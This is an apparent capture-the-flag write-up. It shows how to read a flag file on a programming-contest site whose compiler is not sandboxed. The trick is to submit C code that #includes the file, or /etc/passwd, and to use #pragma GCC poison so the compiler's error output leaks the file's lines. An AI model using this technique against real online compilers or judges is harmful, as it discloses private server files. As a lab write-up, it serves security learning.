### Will it stop?

* Player is expected to either include `../flag[.txt]` or
look into `/etc/passwd` and then include `/home/aturing/flag[.txt]`.

## Category: MISC

## Idea
It is a misconfiguration when on PPC websites compiler isn't running
in a sandbox and stderr of compilation is given to the user verbatim.

## Solution

But first a bait flag!
Compiling:
```
#include "/home/aturing/flag"
```

Gives:
```
In file included from solve.c:2:
flag:1:5: error: expected ‘=’, ‘,’, ‘;’, ‘asm’ or ‘__attribute__’ before ‘:’ token
    1 | jctf:is_this_the_real_flag__is_this_just_fantasy
      |
```

True solution:
Compiling:
```
#pragma GCC poison jctf
#include "/home/aturing/flag"
```

Gives:
```
In file included from solve.c:2:
flag:1:1: error: attempt to use poisoned "jctf"
    1 | jctf:is_this_the_real_flag__is_this_just_fantasy
      | ^
flag:1:5: error: expected ‘=’, ‘,’, ‘;’, ‘asm’ or ‘__attribute__’ before ‘:’ token
    1 | jctf:is_this_the_real_flag__is_this_just_fantasy
      |     ^
flag:2:1: error: attempt to use poisoned "jctf"
    2 | jctf{how_do_you_find_out__you_have_to_use_the_pragma_directive}
      | ^

```

